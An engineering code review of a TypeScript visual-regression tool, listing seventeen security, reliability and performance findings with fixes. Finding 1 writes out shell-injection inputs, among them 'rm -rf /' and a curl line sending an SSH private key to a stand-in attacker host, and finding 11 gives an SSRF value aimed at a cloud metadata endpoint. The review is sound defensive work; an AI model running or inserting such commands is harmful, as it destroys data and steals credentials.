# Frontguard Engineering Review

Independent code review of `src/core/pipeline.ts`, `src/storage/git-orphan.ts`, `src/render/playwright.ts`, `src/diff/ai-vision.ts`, `src/cli/index.ts` and supporting modules.

---

## 🔴 Critical

### 1. Shell injection via git commands (git-orphan.ts)

**What's wrong:** The `git()` helper passes a raw string to `execSync`:

```ts
function git(args: string, cwd: string): string {
  return execSync(`git ${args}`, { ... });
}
```

Every caller interpolates unsanitized values into this string:

- `git(`show ${this.branch}:${path}`, ...)` — `path` comes from route paths
- `git(`commit -m "${commitMessage}"`, ...)` — commitMessage contains route paths
- `git(`worktree add "${worktreeDir}" ${this.branch}`, ...)` — branch from constructor

`sanitizeRoutePath` strips `<>:"|?*` but does **not** strip shell metacharacters: backticks, `$()`, semicolons, newlines. A route path like `/test"; rm -rf / #` or `/test$(whoami)` achieves arbitrary command execution.

The `branch` parameter comes from the constructor with zero validation. A malicious config value like `; curl attacker.com/exfil?$(cat ~/.ssh/id_rsa) #` runs in the shell.

**Severity:** 🔴 Critical — RCE via crafted route path or branch name.

**Fix:** Use `execFileSync('git', argsArray, ...)` instead of `execSync` with string interpolation. This avoids shell interpretation entirely. Alternatively, validate branch names against `^[a-zA-Z0-9._/-]+$` in the constructor and reject routes with shell metacharacters.

---

### 2. `createOrphanViaWorktree` destroys the working tree (git-orphan.ts)

**What's wrong:** Despite its name, `createOrphanViaWorktree` does **not** use a git worktree. It runs:

```ts
git(`checkout --orphan ${this.branch}`, this.repoDir);
git('rm -rf .', this.repoDir);
```

This executes `git rm -rf .` **in the user's main working directory**, deleting all tracked files. If anything fails between the `rm -rf` and the `checkout ${originalRef}` recovery — an interrupt, a permissions error, a crash — the user's working tree is gone. The files are still in git history, but unstaged/untracked files are permanently lost.

Additionally, the `originalRef` variable is computed at the top of the function, then **overwritten** by `findDefaultBranch()` inside the try block (lines 328-333). The reflog lookup is dead code. If the user is on a feature branch, recovery checks out `main`/`master` instead.

**Severity:** 🔴 Critical — data loss on partial failure during first-time init.

**Fix:** Actually use `git worktree add --orphan` (Git 2.38+) to create the orphan branch in a temp directory. Never run `git checkout --orphan` or `git rm -rf .` in the main repo. The `createOrphanViaCheckout` fallback has the same problem and should use `git init` in a temp dir + push to the repo as a remote.

---

### 3. One commit per baseline write — N² git overhead (git-orphan.ts + pipeline.ts)

**What's wrong:** `updateBaselines` calls `storage.writeBaseline()` in a loop (line 479). Each call goes through `writeToOrphanBranch`, which creates a temporary worktree, stages, commits, and removes the worktree. For 50 routes × 3 viewports × 1 browser = 150 screenshots, this is 150 worktree create/destroy cycles and 150 separate git commits.

In `runPipeline`, the compare stage calls `storage.readBaseline()` sequentially for every screenshot (line 295), each invoking `git show` as a subprocess.

At 10× scale (1500 combinations), this is 1500 `execSync` subprocess spawns for reads and 1500 worktree cycles for writes.

**Severity:** 🔴 Critical — pipeline becomes unusable beyond ~100 combinations. Each worktree cycle takes 500ms+ on spinning disk.

**Fix:** Add a `writeBatch()` method that creates one worktree, writes all files, makes one commit, removes the worktree. For reads, consider reading the tree listing once and extracting blobs in batch.

---

## 🔴 High

### 4. Unbounded memory: all screenshots + DOM snapshots held simultaneously (pipeline.ts + playwright.ts)

**What's wrong:** `renderPages` returns a full array of `ScreenshotResult[]` where each result contains a PNG buffer (easily 1-5MB) and a `domSnapshot` string (full HTML, easily 100KB-1MB). For 150 combinations at 2MB average, that's 300MB of buffers held in memory. At 10× scale, that's 3GB.

The compare stage then creates `DiffResult[]` which holds `baselineImage`, `currentImage`, and `diffImage` — tripling the memory for changed pages.

None of this is streamed or released incrementally.

**Severity:** 🔴 High — OOM crash on moderate-to-large sites in CI (typically 2-4GB memory limit).

**Fix:** Process screenshots in a streaming fashion: render → compare → release buffer for each combination. Don't accumulate all results in arrays. At minimum, null out `domSnapshot` after the compare stage and don't store `baselineImage`/`currentImage` on DiffResult unless needed for AI analysis.

---

### 5. Sequential AI analysis with no concurrency limit (pipeline.ts)

**What's wrong:** The AI analyze stage (pipeline.ts lines 364-393) processes diffs one at a time in a `for` loop. Each call waits for `analyzeWithAI` to complete (including up to 3 retries with 2s+ backoff) before starting the next.

For 20 changed pages, with 60s timeout and 3 retries, worst case is 20 × 4 × 60s = 80 minutes.

**Severity:** 🔴 High — AI analysis stage dominates pipeline runtime, turning minutes into hours.

**Fix:** Use `Promise.allSettled` with a concurrency limiter (e.g., batch of 5). The AI providers support concurrent requests.

---

### 6. `storageState` path traversal (playwright.ts)

**What's wrong:** `config.auth.storageState` is passed directly to Playwright's `browser.newContext()` without path validation (line 202). A value like `../../../etc/passwd` or `/home/user/.ssh/config` would be read by Playwright and its contents potentially leaked through error messages or browser behavior.

In CI environments where config comes from untrusted PRs (common for visual regression tools), this is exploitable.

**Severity:** 🔴 High — arbitrary file read in CI.

**Fix:** Validate that `storageState` resolves to a path within the project directory. Reject absolute paths and paths containing `..`.

---

### 7. Storage init failure silently breaks all subsequent reads (pipeline.ts)

**What's wrong:** In the compare stage (line 283-290):

```ts
try {
  await storage.init();
} catch (err) {
  logger.warn(`Baseline storage init failed: ...`);
}
```

If `init()` throws, `this.initialized` remains `false`. Every subsequent `storage.readBaseline()` call hits `ensureInitialized()` and throws "GitOrphanStorage not initialized." These throws are caught per-screenshot, producing N identical error results. The user sees N error messages instead of one clear "storage unavailable" message.

**Severity:** 🔴 High — noisy failure mode, every screenshot reports the same error.

**Fix:** If storage init fails, skip the entire compare stage and mark all diffs as 'new'. Don't attempt reads on an uninitialized storage.

---

## 🟡 Medium

### 8. `sanitizeRoutePath` allows path traversal (git-orphan.ts)

**What's wrong:** The function strips leading slashes and replaces `<>:"|?*` but does not reject or collapse `..` segments. A route path like `/../../etc/passwd` would produce baseline path `baselines/../../etc/passwd/1440/chromium.png`, writing outside the baselines directory in the worktree.

```ts
function sanitizeRoutePath(route: string): string {
  // No check for '..' segments
  let sanitized = route.startsWith('/') ? route.slice(1) : route;
  sanitized = sanitized.replace(/[<>:"|?*]/g, '_');
  return sanitized;
}
```

**Severity:** 🟡 Medium — path traversal within the git worktree. Limited blast radius since it's a temporary directory, but could overwrite worktree git metadata.

**Fix:** Add `.replace(/\.\./g, '_')` or reject routes containing `..`.

---

### 9. Threshold semantics split across two files (pixel.ts + pipeline.ts)

**What's wrong:** `pixel.ts` determines `status: 'regression'` using `diffPercentage / 100 > threshold` (line 130). Then `pipeline.ts` re-checks with `diff.diffPercentage > config.threshold * 100` (line 312), but only for `status === 'changed'` results.

This means:
- `pixel.ts` handles normal regression detection
- `pipeline.ts` re-promotes dimension-mismatch results (always `'changed'` in pixel.ts) to `'regression'`

But the logic is not documented, the dual-check is confusing, and the same threshold comparison is implemented two different ways (`diffPercentage / 100 > threshold` vs `diffPercentage > threshold * 100`). A floating-point edge case could cause inconsistent classification.

**Severity:** 🟡 Medium — confusing, maintenance hazard, potential classification inconsistency.

**Fix:** Centralize threshold logic in one place. Have `pixel.ts` return raw diff data and let the pipeline make all status decisions.

---

### 10. Browser name not validated against enum (cli/index.ts)

**What's wrong:** CLI browser parsing casts directly without validation:

```ts
config.browsers = opts.browsers.split(',').map(...).filter(Boolean) as BrowserEngine[];
```

A user passing `--browsers chrome` (instead of `chromium`) gets no error at config time. The error surfaces later in `renderPages` when `engines[engine]` is `undefined` and `.launch()` throws a cryptic "Cannot read properties of undefined" error.

**Severity:** 🟡 Medium — poor DX, confusing error at wrong stage.

**Fix:** Validate browser names against the `BrowserEngine` type (`chromium`, `firefox`, `webkit`) during CLI parsing and error immediately with a clear message.

---

### 11. Preview URL detection enables SSRF (preview-url.ts + pipeline.ts)

**What's wrong:** `detectPreviewUrl()` reads URLs from environment variables (`VERCEL_URL`, etc.) and the pipeline then navigates Playwright to those URLs. In CI environments where env vars can be set by PR authors (GitHub Actions, for example, exposes PR-provided env vars), an attacker can set `FRONTGUARD_URL=http://169.254.169.254/latest/meta-data/` to make Playwright fetch AWS metadata.

The `waitForUrl` polling also hits the attacker-controlled URL with `fetch()`.

**Severity:** 🟡 Medium — SSRF in CI; exploitability depends on CI platform's env var isolation.

**Fix:** Validate that detected URLs resolve to public DNS. Reject RFC 1918 addresses, link-local, and metadata endpoints. At minimum, document the trust model.

---

### 12. `redact()` not applied to thrown errors (multiple files)

**What's wrong:** The logger's `formatMessage` calls `redact()`, so logged output is safe. But errors thrown by `git-orphan.ts`, `ai-vision.ts`, and `pipeline.ts` contain raw messages that may include API keys or tokens in error responses. These thrown errors can surface in CI logs, HTML reports, or GitHub PR comments without redaction.

Example: An API error response body might contain the request's API key echo, and `handleHTTPError` includes `body.substring(0, 200)` in the thrown error.

**Severity:** 🟡 Medium — potential secret leakage in error paths.

**Fix:** Apply `redact()` to all error messages at the throw site, or add a central error handler that redacts before surfacing.

---

### 13. AbortController timeout leak on success (ai-vision.ts)

**What's wrong:** The `clearTimeout` is in `finally`, which is correct. However, if the `fetch` resolves quickly but `response.json()` or subsequent processing takes time, the abort signal is still ticking. If processing takes longer than `REQUEST_TIMEOUT_MS`, the abort signal fires on an already-consumed response, which is harmless but indicates the timeout scope is wrong — it covers the full request + parse + validate, not just the network call.

More importantly, if `fetch` throws a non-AbortError during the processing phase (e.g., JSON parse), the `finally` block's `clearTimeout` runs fine, but the retry logic might retry what was actually a valid API response with unparseable content — wasting API credits.

Actually, the real issue: `isRetryable` returns `true` for all non-`AIAnalysisError` errors (line 89), meaning JSON parse failures inside `callOpenAI`/`callAnthropic` will retry the same request 3 times, getting the same unparseable response.

**Severity:** 🟡 Medium — wastes API credits retrying parse failures that will always fail.

**Fix:** Wrap JSON parse errors in `AIAnalysisError` with no `statusCode` so `isRetryable` returns `false` for them (since `statusCode` is undefined, the check `err.statusCode === 429` is false and `err.statusCode >= 500` is false, so it returns false). Actually — re-reading the code, `parseAIResponse` already throws `AIAnalysisError` without a statusCode. So `isRetryable` returns false for parse failures. The issue is only for non-`AIAnalysisError` exceptions (line 89 returns `true`), which would be network-level errors. This is actually fine. **Downgrading: the retry logic is correct.** Removing this finding.

---

### 13. (Replacement) `waitForUrl` blocks pipeline for up to 150 seconds (pipeline.ts + preview-url.ts)

**What's wrong:** Default: 10 attempts × 15 second intervals = 150 seconds of blocking before the pipeline even starts rendering. No way for the user to know this is happening in a non-verbose mode since `logger.info` only shows with `--verbose`.

In CI where the preview URL is ready, this adds 0-15 seconds. But if the URL never comes up, it blocks for 2.5 minutes then logs a warning and proceeds to fail on every render.

**Severity:** 🟡 Medium — CI pipeline wastes time on dead URLs; poor user visibility.

**Fix:** Reduce max attempts to 5, reduce interval to 10s. Make waiting visible even without `--verbose` (use reporter, not just logger). Add a `--skip-wait` flag.

---

### 14. No test coverage for critical paths

**What's wrong:** Existing tests cover: `filesystem.test.ts`, `pixel.test.ts`, `parser.test.ts`, `pipeline.test.ts` (e2e), `retry.test.ts`, `redact.test.ts`, `config.test.ts`.

Missing test coverage for:
- **`git-orphan.ts`**: Zero tests. The most complex and dangerous module (shell commands, worktree management, concurrent write handling). The `createOrphanViaWorktree` bug (finding #2) would be caught by any integration test.
- **`ai-vision.ts`**: Zero tests. Response parsing, confidence normalization (0-100 vs 0-1), error classification, retry behavior — all untested.
- **`playwright.ts`**: Zero tests. OOM detection, animation freezing, ignore rules, crop logic — all untested.
- **`cli/index.ts`**: Zero tests. Config merging, threshold conversion (percentage vs fraction), browser validation — all untested.
- **Path traversal in `sanitizeRoutePath`**: Not tested.
- **Concurrent worktree writes**: Not tested.

The Friday-2am failures: a new git version changes `worktree` output format, an AI provider changes their error response shape, Playwright updates its context API, or a malformed PNG buffer causes an infinite loop in `cropToMaxHeight`.

**Severity:** 🟡 Medium — the untested modules are where all the critical bugs are.

**Fix:** Priority order for new tests:
1. `git-orphan.ts`: init, read, write, concurrent writes, createOrphanBranch recovery
2. `ai-vision.ts`: parseAIResponse with valid/invalid/wrapped JSON, confidence normalization, HTTP error mapping
3. `cli/index.ts`: threshold conversion, browser validation, config merging
4. `playwright.ts`: cropToMaxHeight edge cases, ignore rules

---

## 🟢 Architecture Notes

### 15. Pipeline creates new storage instance every run

`runPipeline` instantiates `new GitOrphanStorage(process.cwd())` inside the compare stage (line 282). `updateBaselines` does the same (line 473). There's no dependency injection — the storage implementation is hardcoded.

The `BaselineStorage` interface exists in types.ts but is never used as a parameter type in the pipeline. This makes it impossible to use alternative storage backends (S3, local directory) without forking the pipeline.

**Fix:** Accept `BaselineStorage` as a parameter to `runPipeline` and `updateBaselines`. Instantiate the default in the CLI layer.

---

### 16. Config mutation in pipeline (pipeline.ts)

Line 113: `config = { ...config, baseUrl: previewUrl }` — the pipeline creates a shallow copy and overwrites `baseUrl`. This is safe because of the spread, but the original `config` parameter is typed as `FrontguardConfig` not `Readonly<FrontguardConfig>`, and other stages might accidentally mutate it directly.

In the compare stage (line 312), `diff` is reassigned with spread: `diff = { ...diff, status: 'regression' }`. But in the AI stage (line 369), `diff.aiAnalysis = analysis` and `diff.status = 'changed'` mutate the object directly. Since `changedDiffs` is a filtered view of `diffs`, these mutations affect the original array — which is correct behavior here but fragile.

**Fix:** Use `Readonly<FrontguardConfig>` for the parameter type. Document the intentional mutation in the AI stage.

---

### 17. `process.exit()` in CLI prevents graceful cleanup

`handleFatalError` calls `process.exit(2)`, and the `run` action calls `process.exit(0|1|2)` in multiple places. This kills the process immediately, preventing any cleanup handlers (e.g., Playwright browser close, worktree removal).

**Fix:** Throw errors and let the top-level `program.parseAsync().catch()` handle the exit code. Or register cleanup handlers with `process.on('exit', ...)`.

---

### Summary Table

| # | Finding | Severity | File(s) |
|---|---------|----------|---------|
| 1 | Shell injection via git commands | 🔴 Critical | git-orphan.ts |
| 2 | `createOrphanViaWorktree` destroys working tree | 🔴 Critical | git-orphan.ts |
| 3 | One commit per baseline write — N² overhead | 🔴 Critical | git-orphan.ts, pipeline.ts |
| 4 | Unbounded memory (all screenshots in RAM) | 🔴 High | pipeline.ts, playwright.ts |
| 5 | Sequential AI with no concurrency | 🔴 High | pipeline.ts |
| 6 | `storageState` path traversal | 🔴 High | playwright.ts |
| 7 | Storage init failure breaks all reads | 🔴 High | pipeline.ts |
| 8 | `sanitizeRoutePath` allows `..` traversal | 🟡 Medium | git-orphan.ts |
| 9 | Threshold logic split across two files | 🟡 Medium | pixel.ts, pipeline.ts |
| 10 | Browser name not validated | 🟡 Medium | cli/index.ts |
| 11 | SSRF via preview URL detection | 🟡 Medium | preview-url.ts |
| 12 | `redact()` not applied to thrown errors | 🟡 Medium | multiple |
| 13 | `waitForUrl` blocks 150s with poor visibility | 🟡 Medium | pipeline.ts, preview-url.ts |
| 14 | No tests for git-orphan, ai-vision, playwright, cli | 🟡 Medium | test/ |
| 15 | No storage DI — hardcoded GitOrphanStorage | 🟢 Low | pipeline.ts |
| 16 | Config mutation pattern is fragile | 🟢 Low | pipeline.ts |
| 17 | `process.exit()` prevents cleanup | 🟢 Low | cli/index.ts |
